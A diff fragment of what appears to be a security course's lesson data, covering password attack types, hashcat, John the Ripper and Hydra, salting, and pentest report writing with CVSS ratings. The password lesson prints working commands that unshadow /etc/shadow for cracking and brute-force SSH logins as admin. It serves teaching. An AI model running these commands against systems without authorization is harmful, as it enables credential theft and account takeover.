+    titleEn: "Password Attacks",
+    pages: [
+      { titleEn: "Types of Password Attacks", contentEn: `<p><strong>Brute Force</strong> — try every combination (slow). <strong>Dictionary</strong> — try from a wordlist (fast). <strong>Hybrid</strong> — word + variations. <strong>Rainbow Tables</strong> — pre-computed hash tables. <strong>Password Spraying</strong> — one password against many accounts. <strong>Credential Stuffing</strong> — leaked creds on other sites.</p>` },
+      { titleEn: "Hashcat", contentEn: `<p>Fastest hash cracker (uses GPU). <code>hashcat -m 0 hashes.txt rockyou.txt</code>. Hash types: 0=MD5, 100=SHA1, 1400=SHA-256, 1800=SHA-512, 1000=NTLM, 3200=bcrypt. Mask attack: <code>-a 3 '?u?l?l?l?d?d?d'</code>.</p>` },
+      { titleEn: "John the Ripper and Hydra", contentEn: `<p><strong>John:</strong> <code>unshadow /etc/passwd /etc/shadow > combined.txt && john combined.txt --wordlist=rockyou.txt</code>. Also cracks ZIP, RAR, SSH keys, PDF.</p><p><strong>Hydra</strong> (online brute force): <code>hydra -l admin -P rockyou.txt ssh://target</code>.</p>` },
+      { titleEn: "Rainbow Tables and Salting", contentEn: `<p><strong>Rainbow Table:</strong> pre-computed hash→password lookup. <strong>Salt:</strong> random string added per user before hashing — same password gets different hashes, making rainbow tables useless.</p><p><strong>Modern algorithms:</strong> bcrypt (slow on purpose), Argon2 (needs memory), scrypt. MD5/SHA1 are NOT safe for passwords (~10 billion/sec on GPU).</p>` },
+      {}
+    ]
+  },
+  608: {
+    titleEn: "Report Writing",
+    pages: [
+      { titleEn: "Why the Report Matters", contentEn: `<p>The report is the <strong>final product</strong>. Audiences: Management (risk level), Technical team (how to fix), Legal (compliance). Structure: Executive Summary, Scope & Methodology, Findings, Risk Rating, Recommendations, Appendix.</p>` },
+      { titleEn: "CVSS — Severity Rating", contentEn: `<p><strong>CVSS</strong> scores: 0-3.9 Low, 4.0-6.9 Medium, 7.0-8.9 High, 9.0-10.0 Critical. Criteria: Attack Vector, Complexity, Privileges Required, User Interaction, Impact on Confidentiality/Integrity/Availability.</p>` },
+      { titleEn: "Writing a Finding", contentEn: `<p>Each finding includes: <strong>Severity</strong> (CVSS), <strong>Description</strong>, <strong>Steps to Reproduce</strong>, <strong>Evidence</strong> (screenshots, captures), <strong>Impact</strong>, <strong>Recommendation</strong>, <strong>References</strong> (OWASP, CWE).</p>` },
+      { titleEn: "Executive Summary and Recommendations", contentEn: `<p>Executive Summary: clear, short, no jargon. Include finding counts by severity, overall risk, business impact, immediate actions.</p><p><strong>Priority:</strong> Immediate (0-7 days) = Critical. Short-term (1-4 weeks) = High. Medium (1-3 months). Long-term (3-6 months) = Low.</p>` },
+      {}
+    ]
+  },
 
   // ===== Dark Web & Privacy (801-805) =====
   801: {
